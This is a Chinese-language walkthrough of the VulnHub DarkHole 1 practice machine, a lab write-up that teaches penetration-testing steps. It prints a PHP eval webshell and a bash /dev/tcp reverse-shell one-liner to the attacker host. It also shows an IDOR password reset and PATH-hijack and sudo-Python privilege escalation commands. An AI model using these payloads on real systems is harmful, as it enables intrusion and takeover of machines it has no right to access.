
@[TOC](VulnHub)

---

> VulnHub 打靶记录。官网：[https://www.vulnhub.com](https://www.vulnhub.com)

> 攻击机为 Kali-Linux-2023.2-vmware-amd64。
> Kali NAT IP：192.168.8.10。

# 1：靶场信息

靶场网址：[https://www.vulnhub.com/entry/darkhole-1,724/](https://www.vulnhub.com/entry/darkhole-1,724/)

# 2：打靶
## 2.1：情报收集&威胁建模

首先确定目标 ip：

**主机发现**：
`nmap -sn 192.168.8.0/24`

![在这里插入图片描述](https://img-blog.csdnimg.cn/cf1d030254cd442394d2bfc973b03962.png)

目标 ip 为 192.168.8.108。

接着扫描一下目标端口信息：

**目标信息扫描**：
`nmap -sS -sV -T4 -n -p- 192.168.8.108`

![在这里插入图片描述](https://img-blog.csdnimg.cn/f347cb37882240f89618f1dc8dcf5c0e.png)

目标开放了 80 端口和 22 端口。

访问 80 端口，有一个登录页面，还有注册页面。

![在这里插入图片描述](https://img-blog.csdnimg.cn/23253255e8094764a1e118432fc508ad.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/d9c56e19c9b348e28f78d4ac8659707e.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/91deef0f404b43809d931708ed618b62.png)

除此以外再扫描一下网站目录。

**扫描网站目录**：
`dirsearch -u http://192.168.8.108/`

经过检查没有太多有用的信息，（但 /upload/ 目录下有彩蛋。

![在这里插入图片描述](https://img-blog.csdnimg.cn/94a1efb3b06242d3b179144ac44486f6.png)


## 2.2：漏洞分析&渗透攻击

80 端口的 web 初步检查没有弱点，只能先注册一个账号登录进去看看。

登录后的页面，有一个更新用户信息和修改密码的选项。

![在这里插入图片描述](https://img-blog.csdnimg.cn/9f80790b827b489e9249529a434b77c5.png)

尝试修改 url 的 ID 参数，无果。

![在这里插入图片描述](https://img-blog.csdnimg.cn/f8d09e12a15144b6a66bada03beed200.png)

没办法。抓包看一下修改密码的数据包。

可以看到修改密码时附带了用户 ID。

![在这里插入图片描述](https://img-blog.csdnimg.cn/6d4736140b474abb81835b83ead768f6.png)

那就尝试一下能不能通过修改提交的 ID 越权修改其他用户的密码。
尝试修改 ID 为 1 的用户，应该就是 admin。修改成功。

![在这里插入图片描述](https://img-blog.csdnimg.cn/76ae5b65051642f8b087c9edfec69589.png)

登录到 admin 之后发现可以上传文件。

![在这里插入图片描述](https://img-blog.csdnimg.cn/e4d005eb78c54cea927da0510cc6a17f.png)

在各种尝试之后，发现后端检测应该是黑名单机制。成功上传 .phtml 文件。

![在这里插入图片描述](https://img-blog.csdnimg.cn/2eeabc2fab1948fda42a574b95cf6ed2.png)

```php
<?php 
	echo 'Hello!';
	@eval($_POST['hello']);
?>
```

上传成功后给出了文件地址，访问发现文件可以被执行。

![在这里插入图片描述](https://img-blog.csdnimg.cn/25aee5302eda40b7bf7b117cd6fbf088.png)

使用蚁剑连接。

![在这里插入图片描述](https://img-blog.csdnimg.cn/aa7aca5994c945ccaed5b32a5a4347dd.png)

连接成功后首先使用蚁剑终端进行 shell 反弹。

**反弹 shell**：
1、kali：`nc -lv -p 6666`
2、server：`bash -c 'exec bash -i &>/dev/tcp/192.168.8.10/6666 <&1'`

成功反弹 shell。这里尝试了其他反弹 shell 的代码，有些不知道为什么不能运行，不过换其他语句即可。

![在这里插入图片描述](https://img-blog.csdnimg.cn/6681841288b14383aadb05788a75e546.png)

> 这里说一下为什么要第一时间反弹 shell，因为在其他终端（网页、蚁剑等）可能会有潜在的限制。不便于之后的操作（例如提权）。

可以尝试使用 `find` 命令查找敏感文件。不过这里直接查看一下 ==/etc/passwd== 文件，寻找一下存在可以提权的用户。

`cat /etc/passwd | grep /bin/bash`

![在这里插入图片描述](https://img-blog.csdnimg.cn/6a12ec531a764720b4fe1d4404edd298.png)

进入到 darkhole 与 john 用户的 home 目录，寻找有用信息。在 john 目录下发现一些有趣的文件。

![在这里插入图片描述](https://img-blog.csdnimg.cn/b8754765a31144b1a087f77648c6031b.png)

==password== 与 ==user.txt== 文件无权查看。
运行一下 ==toto== 文件，发现它以 john 用户的身份运行类似 `id` 的命令。

![在这里插入图片描述](https://img-blog.csdnimg.cn/011d0ae196bc4264bd55da79d86fe37e.png)

那就尝试使用该文件提权。

1. 在本地编辑新的 ==id== 文件，写入 /bin/bash，给执行权限。
2. 然后将文件路径写入到原有环境变量前，这样使用 `id` 命令时就会优先匹配此路径下的 ==id== 文件运行。
3. 所以运行 ==toto== 文件使用 john 身份调用 `id` 命令，实际上就是使用 john 身份调用 ==id== 文件运行，即可获得 john 的 shell。

**创建一个新 id 文件**：
`echo '/bin/bash' > /tmp/id`

**赋予权限**：
`chmod +x /tmp/id`

**改变环境变量**：
`export PATH=/tmp:$PATH`

![在这里插入图片描述](https://img-blog.csdnimg.cn/be7edd28fb44407ba0f9265636791297.png)

然后运行 ==toto== 文件即获得 john 权限。

![在这里插入图片描述](https://img-blog.csdnimg.cn/21af2d1251a947fb9f2bf0cdce2f0104.png)

之后查看 ==/home/john/== 下原本无权查看的 ==password== 文件与 ==user.txt== 文件。

![在这里插入图片描述](https://img-blog.csdnimg.cn/b97bc5d290bd43a59c4ee47ffb3f930b.png)

得到一个密码：root123。猜测是 john 用户的相关密码。

同时目标开启了 22 端口，提供 ssh 服务。尝试使用 john 账户登录。

![在这里插入图片描述](https://img-blog.csdnimg.cn/b159d71229b2471196eade49b616731e.png)

现在仍然是 john 账户，接下来提权到 root。

**查看用户能够使用 sudo 运行的命令**：
`sudo -l`

![在这里插入图片描述](https://img-blog.csdnimg.cn/64887655ae034135b12c126dc2864dee.png)

> 运行 `sudo -l`，用户可以了解自己在系统上具有的 sudo 权限，以及可以运行的特权命令与文件。

可以看到 john 用户可以以管理员身份运行 ==/home/john/file.py==。

 - 那么只要通过此文件执行获取 shell，即可获得管理员权限。

1. 将获取 shell 的命令加入到此 python 文件。
`echo 'import os;os.system("/bin/bash")' > file.py`
2. 以管理员身份执行即可。
`sudo python3 /home/john/file.py`

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b63219309e546bbbaa6bb5323c7aa48.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/9762b093c89047a2ae4f040880c7ba81.png)

成功获取 root 权限。完结撒花！(◕ᴗ◕✿)

最后补充一下为什么要通过 ssh 连接以后再提权：如果直接通过反弹的 shell 尝试提权至 root，会出现以下情况：

![在这里插入图片描述](https://img-blog.csdnimg.cn/4a938a4700b14bee957d8a54c23b60ca.png)

完结 (◕ᴗ◕✿)

# 3：总结

## 3.1：命令&工具

 - nmap
 - dirsearch
 - BurpSuite
 - 蚁剑
 - NetCat
 - bash
 - ssh
 - python

### 3.1.1：Nmap

**部分选项**：

| 参数 | 介绍 |
|:-- |:-- |
| `-sn` | `Ping Scan - disable port scan` |
| `-sS/sT/sA/sW/sM` | `TCP SYN/Connect()/ACK/Window/Maimon scans` |
| `-sV` | `Probe open ports to determine service/version info` |
| `-T<0-5>` | `Set timing template (higher is faster)` |
| `-n/-R` | `Never do DNS resolution/Always resolve [default: sometimes]` |
| `-p-` | `描目标主机的所有端口` |


## 3.2：关键技术

 - **主机发现**：
`nmap -sn <IP>`

 - **目标信息扫描**，扫描所有端口及开放端口的服务：
`nmap -sS -sV -T<0-5> -n -p- <target>`

 - **网站目录扫描**：
`dirsearch -u <URL>`

 - **网站逻辑漏洞**，越权之修改密码。

 - **文件上传漏洞**。

 - **蚁剑连接一句话木马**。

 - **反弹 shell**：
1、kali：`nc -lv -p <端口>`
2、server：`bash -c 'exec bash -i &>/dev/tcp/<IP>/<端口> <&1'`

> - `bash -c`：让系统运行一个新的 Bash shell，`-c` 选项后是实际要执行的命令。
> - `exec`：替换当前 shell 进程。这意味着之前的 shell 进程将被关闭，而新的 Bash shell 将接管标准输入、标准输出和标准错误流。
> - `bash -i`：启动一个交互式 Bash shell，`-i` 表示这是一个交互式的 shell，可以接受用户输入。
> - `&>`：重定向操作符，将后续的命令的标准输出和标准错误都重定向到一个文件或设备。在这里即 `/dev/tcp/<IP>/<端口>`，将标准输出和标准错误都重定向到一个指定的 IP 地址和端口。
> - `<&1`：将标准输入重定向到标准输出。确保在建立连接后，用户可以在远程 shell 中输入命令。


 - **Linux 权限、环境变量相关知识**。

 - **查看用户具有的 sudo 权限**：
`sudo -l`

 - **提权**，通过系统调用实现。

 - **python 获取 shell**。

```python
import os;
os.system("/bin/bash")
```


---

<p><font color="#FF6A6A">
若待功成拂衣去，武陵桃花笑杀人。
</font></p>
<p align="right"><font color="#FF6A6A">
——《当涂赵炎少府粉图山水歌》（唐）李白
</font></p>

